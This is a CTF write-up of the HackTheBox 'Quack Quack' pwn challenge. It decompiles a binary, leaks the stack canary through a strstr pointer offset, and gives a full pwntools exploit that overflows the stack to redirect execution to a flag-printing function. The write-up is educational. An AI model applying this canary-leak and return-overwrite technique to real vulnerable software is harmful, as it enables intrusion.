---
title: Quack Quack @ HackTheBox Apocalypse 2025
date: 2025-04-12 11:47:00 +0800
categories: [CTF, HackTheBox, Pwn]
tags: [writeups, binary exploitation, pwn]
math: true
mermaid: true
media_subpath: /assets/posts/2024-12-26-HTB-Quack-Quack
image:
  path: preview.jpg
---

## Binary Exploitation - Quack Quack
Difficulty: Very Easy

Overview: 

### Basic file checks
The challenge begins with a zip file that we download from the HTB website. Here's a breakdown of its contents:
```
mcsam@0x32:~/HTBAppocalypse/pwn/quack_quack$ unzip -l pwn_quack_quack.zip 
Archive:  pwn_quack_quack.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2024-05-01 23:49   challenge/
        0  2024-05-01 23:49   challenge/glibc/
  2220400  2024-05-01 23:49   challenge/glibc/libc.so.6
   240936  2024-05-01 23:49   challenge/glibc/ld-linux-x86-64.so.2
    20672  2024-05-01 23:49   challenge/quack_quack
       25  2024-05-01 23:49   challenge/flag.txt
---------                     -------
  2482033                     6 files
```

Among the files, we find the binary named quack_quack. We quickly unzip and run some basic file checks on the binary.
As with any binary exploitation challenge, we start by running `checksec` on our binary to see which security features have been enabled on the binary.
```
mcsam@0x32:~/HTBAppocalypse/pwn/quack_quack/challenge$ checksec --file quack_quack
[*] '/home/mcsam/HTBAppocalypse/pwn/quack_quack/challenge/quack_quack'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    RUNPATH:    b'./glibc/'
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

PIE (Position Independent Executable) is disabled on this binary, i guess this is good news for us since we can use static memory addresses hence making the challenge easier. However, there is a stack canary which might try to stop us from shifting control :joy:. Anyways you'll see how can use knowledge of the dark arts to bypass this and shift control.

### Decompiling and identifying vulnerabilties
Now that we know the protections enabled we can go ahead to decompile it to identify possible vulnerabilties and flaws. We can spin up Ghidra and begin analysis.   
![Ghidra Intial Decompilation](ghidra_decompilation_and_functions.png)

From the image we can see the decompilation of the `main` function. In the `main` function we can see that a call is made to the `duckling` function. Also in the symbol tree section we an see other functions in this binary like `duck_attack`. Let's take a quick look at the decompilation for the `duck_attack` function. 

![duck_attack Function Decompilation](duck_attack_function_decompilation.png)
It's quite obvious that the `ducK_attack` function reads the content on the `flag.txt` file and prints it out standard output. We have to find a way to direct execution to this function to obtain the flag for this challenge.

Let's also take a look at the `ducking` function.
```c
void duckling(void)

{
  char *pcVar1;
  long in_FS_OFFSET;
  char local_88 [32];
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  undefined8 local_48;
  undefined8 local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined8 local_20;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  ...
  local_68 = 0;
  local_60 = 0;
  local_58 = 0;
  local_50 = 0;
  local_48 = 0;
  local_40 = 0;
  local_38 = 0;
  local_30 = 0;
  local_28 = 0;
  local_20 = 0;
  printf("Quack the Duck!\n\n> ");
  fflush(stdout);
  read(0,local_88,0x66);
  pcVar1 = strstr(local_88,"Quack Quack ");
  if (pcVar1 == (char *)0x0) {
    error("Where are your Quack Manners?!\n");
                    /* WARNING: Subroutine does not return */
    exit(0x520);
  }
  printf("Quack Quack %s, ready to fight the Duck?\n\n> ",pcVar1 + 0x20);
  read(0,&local_68,0x6a);
  puts("Did you really expect to win a fight against a Duck?!\n");
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

Looking at the code in the `duckling` function we can see that the `read` syscall is being use to take 102 bytes from standard input and placed in `local_88` which is just a 32 bytes array. From this analysis alone, we can see buffer overflow rearing its ugly head here. Another buffer overflow also can been seen in the second `read` function, for now we will only focus on the first buffer overflow .This means we can write outside the bounds on the array and write to other regions of memory to take conrol of the return address. There's one challenge though, the is a stack canary which prevents us from doing this. This canary lies right before the return address as a result if we try to overwrite the return address, the stack canary also get overwritten and the program exits.


To be able to bypass this we must find a way to leak the stack canary (`local_10`). Upon further analysis we observe that the `strstr` function is being is used to check for the existence of the substring `Quack Quack ` in `local_88`. The `strstr` function basically looks for a substring in a larger string and returns a pointer to the first occurence of the substring. In this case `strstr` will return a pointer to the first `Q` of the substring `Quack Quack ` if it finds it in the larger string and it will be stored in `pcVar1`.

The `if` condition checks to see if `strstr` returns a NULL value and if it doesn't a `printf` statment is executed. But we notice something here, the pointer value stored in `pcVar1` in incremented by 0x20 (32 in decimal) and dereferenced to print out the value to standard output. There is a flaw in this logic because of `pcVar1 + 0x20` can be used to access items in other regions in memory given that the attacker is able to control `pcVar1`. We can leverage this to leak the stack canary.

### Understading the vulnerabilty and crafting an exploit
We need to find the stack canary offset so we can leak it using the `printf` function. To be able to do that we can use `pwndbg` to calculate this offset. We can do this but setting a break point on the first `read` syscall in the `duckling` function.
```
b *0x0000000000401562
```

And then we run the program and enter 8 * 'A's + 'Quack Quack ' (`AAAAAAAAQuack Quack `) . Next we will look at what exactly the value of the stack canary is and we can do this using the `canary` gdb command. This prints out the canary to us and from this we can search the stack to find the stack canary value. When we find it then we can calculate the offset to the value from `rsi`. Remember that our initial payload `AAAAAAAAQuack Quack ` is the **second argument** to the `read` function. In `x86_64` the `rsi` register is used to hold the second argument of a function.

We can print the contents of the stack from `rsi` and search for the stack canary.
![Stack Canary](stack_canary.png)

After we find the stack canary we can calculate the offset from the begining of our input to the stack canary which is 120 bytes. And we know that 0x20 bytes is added to the pointer in `pcVar1 + 0x20`. As a result of this `pcVar1 + 0x20` handles part of the 120 offset. This reduces the number of character we need to enter to point to the canary to `120 - 32 = 88`. 

To be able to leak the canary we can use the payload (`'A' * 89 + 'Quack Quack '`). We add an addiontal 1 byte to include the null byte for the canary to make sure `printf` knows when to stop printing. We can use the code below to leak the stack canary.
```python
canary_offset = 88 + 1 # +1 for null pointer

io.sendafter("> ", b'A'*canary_offset+b"Quack Quack ")

data_recv = io.recv()
canary_bytes = data_recv.split(b',')[0].strip(b'Quack Quack')[:7]
   
canary = u64(b"\x00"+canary_bytes)
```


After successfully leaking the canary we exploit the second buffer overflow we discovered earlier to overwrite the contents of the stack and place the right value in the canary section. From here we overwrite the return address to point to the `duck_attack` function. Before doing that we need to find the address of the `duck_attack` function and we can do that easily using `pwndbg` or `gdb`.  
![Address of the duck_attack function](address_of_duck_attack_function.png)

Now that we know the address of the `duck_attack` function we can craft our second payload to excuted it.
```python
canary_offset = canary_offset - 1 
padding = "A" * canary_offset
duck_attack = 0x000000000040137f
padding_before_ret = "B" * 8

payload = flat(
    [
        padding,
        canary,
        padding_before_ret,
        duck_attack
    ]
)

io.send(payload)

flag = io.recv()

print(f"Flag: {flag}")
io.close()
```

The full exploit: 
```
def init():
    global io

    io = start()


def solve():
    offset = 39
    canary_offset = 88 + 1 # +1 for null pointer

    io.sendafter("> ", b'A'*canary_offset+b"Quack Quack ")

    data_recv = io.recv()
    canary_bytes = data_recv.split(b',')[0].strip(b'Quack Quack')[:7]
   
    canary = u64(b"\x00"+canary_bytes)

    print(f"Canary====> {canary}")

    canary_offset = canary_offset - 1 
    padding = "A" * canary_offset
    duck_attack = 0x000000000040137f
    padding_before_ret = "B" * 8

    payload = flat(
        [
            padding,
            canary,
            padding_before_ret,
            duck_attack
        ]
    )

    io.send(payload)
    
    flag = io.recv()

    print(f"Flag: {flag}")
    io.close()

def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()
```

We ran the exploit and viola we get the flag.